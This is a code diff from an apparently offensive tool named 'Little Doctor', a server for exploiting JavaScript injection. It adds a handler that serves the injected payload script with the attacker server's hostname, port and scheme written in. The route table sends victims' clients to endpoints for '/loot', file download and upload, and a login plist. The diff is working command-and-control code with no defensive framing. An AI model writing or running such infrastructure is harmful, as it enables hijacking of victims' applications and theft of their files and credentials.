@@ -192,12 +192,36 @@ class FourOhFourHandler(BaseRequestHandler):
 """)
 
 
+class LittleDoctorJsHandler(BaseRequestHandler):
+
+    """
+    Shitty way to do this but once we get JS execution there's no way to
+    determine the server hostname (depending on the type of injection) so
+    we just gotta hardcode it in the JavaScript.
+    """
+
+    _LITTLE_DOCTOR_JS = "js/dist/main/little-doctor.js"
+
+    def get(self, *args, **kwargs):
+        """ The modules are loaded via RequireJS this is just the main.js """
+        self.set_header("Content-Type", "application/javascript")
+        with open(self._LITTLE_DOCTOR_JS) as fp:
+            js = fp.read().replace("__LITTLE_DOCTOR_HOSTNAME__", options.hostname)
+            js = js.replace("__LITTLE_DOCTOR_LISTEN_PORT__", options.listen_port)
+            js = js.replace("__LITTLE_DOCTOR_SCHEME__", options.scheme)
+            self.write(js)
+
+
 LITTLE_DOCTOR_HANDLERS = [
     (r"/loot", LootHandler),
+
     (r"/login/plist", LoginPlistHandler),
     (r"/download", DownloadHandler),
     (r"/upload", FileUploadHandler),
-    (r"/js/(.*)", StaticFileHandler, {"path": "js/dist"}),
+
+    (r"/js/(.*)", LittleDoctorJsHandler),
+    (r"/modules/(.*)", StaticFileHandler, {"path": "js/dist/modules"}),
+
     (r"/(.*)", FourOhFourHandler)
 ]
 
@@ -213,7 +237,8 @@ def start_app():
     server.listen(options.listen_port)
     io_loop = IOLoop.instance()
     try:
-        logging.info("Starting Little Docter server on port %s", options.listen_port)
+        logging.info("Starting Little Docter server on  %s://%s:%s",
+                     options.scheme, options.hostname, options.listen_port)
         io_loop.start()
     except KeyboardInterrupt:
         logging.warn("Keyboard interrupt, shutdown everything!")
